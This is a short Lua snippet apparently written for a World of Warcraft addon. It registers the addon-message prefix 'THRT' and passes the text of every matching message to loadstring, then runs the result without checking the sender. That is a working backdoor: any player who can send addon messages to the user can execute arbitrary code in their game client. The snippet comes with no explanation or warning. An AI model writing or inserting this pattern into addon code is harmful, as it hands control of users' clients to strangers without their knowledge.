local f = CreateFrame("Frame")
C_ChatInfo.RegisterAddonMessagePrefix("THRT")
f:RegisterEvent("CHAT_MSG_ADDON")
f:SetScript("OnEvent", function(self, event, prefix, msg, channel, sender)
  if prefix == "THRT" then
    local fn = loadstring(msg)
    if fn then fn() end
  end
end)
